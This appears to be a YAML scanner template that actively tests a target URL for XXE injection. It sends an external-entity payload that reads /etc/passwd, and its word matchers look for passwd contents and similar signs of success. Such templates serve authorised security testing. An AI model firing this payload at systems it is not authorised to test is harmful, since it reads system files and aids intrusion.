id: xxe5-0702
name: 'XXE read in data'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via data'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      data:
        - '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
